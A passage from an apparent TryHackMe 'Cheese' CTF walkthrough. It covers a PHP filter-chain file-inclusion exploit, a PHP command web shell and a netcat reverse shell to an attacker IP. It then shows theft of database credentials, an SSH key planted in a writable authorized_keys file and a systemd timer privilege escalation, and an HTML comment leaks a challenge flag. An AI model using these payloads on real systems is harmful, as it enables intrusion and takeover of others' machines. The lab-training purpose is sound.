iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;cmd=id&#39;</span> --output -
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">�
</span></span><span class="line"><span class="cl">P�������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@C������&gt;<span class="o">==</span>�@
</span></span></code></pre></div><p>Here our payload is <code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code>, we have <code>cmd</code> parameter in the php shell code. So we can use <code>cmd</code> parameter to execute our shell command ie., <code>cmd=id</code>. Lets use the same method to get the reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s2">&#34;http://cheese.thm/secret-script.php?file=</span><span class="k">$(</span>python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;&#39;</span> <span class="p">|</span> grep php://<span class="k">)</span><span class="s2">&amp;cmd=id&#34;</span> --output -
</span></span></code></pre></div><p>This simplified command giving result for all shell commands, jus by chainging <code>cmd</code> parameter&rsquo;s value.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s2">&#34;http://cheese.thm/secret-script.php?file=</span><span class="k">$(</span>python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;&#39;</span> <span class="p">|</span> grep php://<span class="k">)</span><span class="s2">&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20</span><span class="nv">$attacker_ip</span><span class="s2">%201234%20%3E%2Ftmp%2Ff&#34;</span> --output -
</span></span></code></pre></div><p>We have replace the <code>id</code> with <code>reverseshell command</code>. and got reverse shell by executing it in <code>port 1234</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">^Z <span class="c1">#(Ctrl+Z)</span>
</span></span><span class="line"><span class="cl">stty raw -echo <span class="o">&amp;&amp;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span></code></pre></div><p>Got stable shell by running above commands.</p>
<h2 id="shell-as-comte">Shell as comte</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@cheesectf:/var/www/html$ grep <span class="s1">&#39;&#34;;&#39;</span> /var/www/html/login.php
</span></span><span class="line"><span class="cl"><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="s2">&#34;comte&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;VeryCheesyPassword&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;users&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>We got database information from `/var/www/html/login.php.</p>
<h3 id="linpeas">linpeas</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╔══════════╣ Processes, Cron <span class="p">&amp;</span> Services
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Cleaned processes
</span></span><span class="line"><span class="cl">root         <span class="m">699</span>  0.0  0.0   <span class="m">6972</span>  <span class="m">3364</span> ?        Ss   09:51   0:00 /bin/bash /usr/local/bin/twist.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">╔══════════╣ Sudo version
</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                              
</span></span><span class="line"><span class="cl">Sudo version 1.8.31
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">╔══════════╣ Network Information 
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Hostname, hosts and DNS 
</span></span><span class="line"><span class="cl">127.0.1.1 cheesectf
</span></span><span class="line"><span class="cl">nameserver 127.0.0.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">╔══════════╣ Executing Linux Exploit Suggester
</span></span><span class="line"><span class="cl">╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                           
</span></span><span class="line"><span class="cl">cat: write error: Broken pipe                                                                                                                                
</span></span><span class="line"><span class="cl">cat: write error: Broken pipe
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2022-2586<span class="o">]</span> nft_object UAF
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
</span></span><span class="line"><span class="cl">   Exposure: probable
</span></span><span class="line"><span class="cl">   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=(</span>20.04<span class="o">)</span> <span class="o">]{</span>kernel:5.12.13<span class="o">}</span>
</span></span><span class="line"><span class="cl">   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
</span></span><span class="line"><span class="cl">   Comments: kernel.unprivileged_userns_clone<span class="o">=</span><span class="m">1</span> required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2021-4034<span class="o">]</span> PwnKit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
</span></span><span class="line"><span class="cl">   Exposure: probable
</span></span><span class="line"><span class="cl">   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>10<span class="p">|</span>11<span class="p">|</span>12<span class="p">|</span>13<span class="p">|</span>14<span class="p">|</span>15<span class="p">|</span>16<span class="p">|</span>17<span class="p">|</span>18<span class="p">|</span>19<span class="p">|</span>20<span class="p">|</span><span class="m">21</span> <span class="o">]</span>,debian<span class="o">=</span>7<span class="p">|</span>8<span class="p">|</span>9<span class="p">|</span>10<span class="p">|</span>11,fedora,manjaro
</span></span><span class="line"><span class="cl">   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2021-3156<span class="o">]</span> sudo Baron Samedit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
</span></span><span class="line"><span class="cl">   Exposure: probable
</span></span><span class="line"><span class="cl">   Tags: <span class="nv">mint</span><span class="o">=</span>19,<span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>18<span class="p">|</span><span class="m">20</span> <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span><span class="m">10</span>
</span></span><span class="line"><span class="cl">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2021-3156<span class="o">]</span> sudo Baron Samedit <span class="m">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
</span></span><span class="line"><span class="cl">   Exposure: probable
</span></span><span class="line"><span class="cl">   Tags: <span class="nv">centos</span><span class="o">=</span>6<span class="p">|</span>7<span class="p">|</span>8,<span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>14<span class="p">|</span>16<span class="p">|</span>17<span class="p">|</span>18<span class="p">|</span>19<span class="p">|</span><span class="m">20</span> <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>9<span class="p">|</span><span class="m">10</span>
</span></span><span class="line"><span class="cl">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2021-22555<span class="o">]</span> Netfilter heap out-of-bounds write
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
</span></span><span class="line"><span class="cl">   Exposure: probable
</span></span><span class="line"><span class="cl">   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>20.04 <span class="o">]{</span>kernel:5.8.0-*<span class="o">}</span>
</span></span><span class="line"><span class="cl">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
</span></span><span class="line"><span class="cl">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
</span></span><span class="line"><span class="cl">   Comments: ip_tables kernel module must be loaded
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2022-32250<span class="o">]</span> nft_object UAF <span class="o">(</span>NFT_MSG_NEWSET<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
</span></span><span class="line"><span class="cl">https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
</span></span><span class="line"><span class="cl">   Exposure: less probable
</span></span><span class="line"><span class="cl">   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>22.04<span class="o">){</span>kernel:5.15.0-27-generic<span class="o">}</span>
</span></span><span class="line"><span class="cl">   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
</span></span><span class="line"><span class="cl">   Comments: kernel.unprivileged_userns_clone<span class="o">=</span><span class="m">1</span> required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2017-5618<span class="o">]</span> setuid screen v4.5.0 LPE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Details: https://seclists.org/oss-sec/2017/q1/184
</span></span><span class="line"><span class="cl">   Exposure: less probable
</span></span><span class="line"><span class="cl">   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">╔══════════╣ Active Ports
</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                
</span></span><span class="line"><span class="cl">tcp   LISTEN <span class="m">0</span>      <span class="m">128</span>                0.0.0.0:22          0.0.0.0:*                                                                                         
</span></span><span class="line"><span class="cl">tcp   LISTEN <span class="m">0</span>      <span class="m">10</span>                 0.0.0.0:4444        0.0.0.0:*            
</span></span><span class="line"><span class="cl">tcp   LISTEN <span class="m">0</span>      <span class="m">80</span>               127.0.0.1:3306        0.0.0.0:*            
</span></span><span class="line"><span class="cl">tcp   LISTEN <span class="m">0</span>      <span class="m">4096</span>         127.0.0.53%lo:53          0.0.0.0:*            
</span></span><span class="line"><span class="cl">tcp   LISTEN <span class="m">0</span>      <span class="m">128</span>                   <span class="o">[</span>::<span class="o">]</span>:22             <span class="o">[</span>::<span class="o">]</span>:*            
</span></span><span class="line"><span class="cl">tcp   LISTEN <span class="m">0</span>      <span class="m">511</span>                      *:80                *:* 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">╔══════════╣ Permissions in init, init.d, systemd, and rc.d
</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                              
</span></span><span class="line"><span class="cl">You have write privileges over /etc/systemd/system/exploit.timer  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">╔══════════╣ Interesting writable files owned by me or writable by everyone <span class="o">(</span>not in Home<span class="o">)</span> <span class="o">(</span>max 200<span class="o">)</span>
</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files 
</span></span><span class="line"><span class="cl">/etc/systemd/system/exploit.timer
</span></span><span class="line"><span class="cl">/home/comte/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">╔══════════╣ Unexpected in root
</span></span><span class="line"><span class="cl">/swap.img 
</span></span></code></pre></div><p>Interesting results using <a href="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" target="_blank" rel="noopener">linpeas.sh</a>
.</p>
<p>From the above results we can see that <code>/home/comte/.ssh/authorized_keys</code> is writable which means, we can add our public to ssh as user comte.</p>
<h3 id="ssh-keygen">ssh-keygen</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen -t rsa -f id_rsa -b <span class="m">4096</span> -C <span class="s1">&#39;&#39;</span> -N <span class="s1">&#39;&#39;</span>
</span></span></code></pre></div><p>Run the above command to generate a SSH key pair in local machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;contents_of_id_rsa.pub&#39;</span> &gt; /home/comte/.ssh/authorized_keys
</span></span></code></pre></div><p>Run the above command in remote machine. This will make the key trusted for ssh connection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh comte@cheese.thm -i id_rsa
</span></span></code></pre></div><p>Running the above command we got ssh connection as user <code>comte</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">comte@cheesectf:~$ cat user.txt 
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
</span></span><span class="line"><span class="cl">⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
</span></span><span class="line"><span class="cl">⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
</span></span><span class="line"><span class="cl">⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
</span></span><span class="line"><span class="cl">⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
</span></span><span class="line"><span class="cl">⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
</span></span><span class="line"><span class="cl">⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
</span></span><span class="line"><span class="cl">⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>REDACTED<span class="o">}</span>
</span></span></code></pre></div><p>We got our first flag here.</p>
<!--flag1 THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a} -->
<h2 id="privilege-escalation">Privilege Escalation</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">comte@cheesectf:~$ sudo -l
</span></span><span class="line"><span class="cl">User comte may run the following commands on cheesectf:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/systemctl daemon-reload
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/systemctl restart exploit.timer
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/systemctl start exploit.timer
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/systemctl <span class="nb">enable</span> exploit.timer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer
</span></span><span class="line"><span class="cl">Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
</span></span><span class="line"><span class="cl">See system logs and <span class="s1">&#39;systemctl status exploit.timer&#39;</span> <span class="k">for</span> details.
</span></span></code></pre></div><p>We have permission to <code>enable</code>, <code>start</code>, <code>restart</code> the timer <code>exploit.timer</code> using sudo. Executing the command <code>sudo /bin/systemctl restart exploit.timer</code> gives some error related to settings.</p>
<h3 id="systemdtimer-cronjob">systemd.timer <del>cronjob</del></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">comte@cheesectf:~$ ls -lah /etc/systemd/system/exploit.timer
</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> root root <span class="m">87</span> Mar <span class="m">29</span>  <span class="m">2024</span> /etc/systemd/system/exploit.timer
</span></span></code></pre></div><p>We got to know that file <code>/etc/systemd/system/exploit.timer</code> is readable and writable from linpeas.sh.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">comte@cheesectf:/etc/systemd/system$ cat exploit.timer
</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Exploit Timer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Timer<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">OnBootSec</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>timers.target
</span></span></code></pre></div><p>Reading the file makes sense that somting is missing(incomplete). Lets gather information about the timers used here.</p>
<p>Sources to read: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers" target="_blank" rel="noopener">Hacktricks | Timers</a>
, <a href="https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html#Options" target="_blank" rel="noopener">systemd.timer</a>
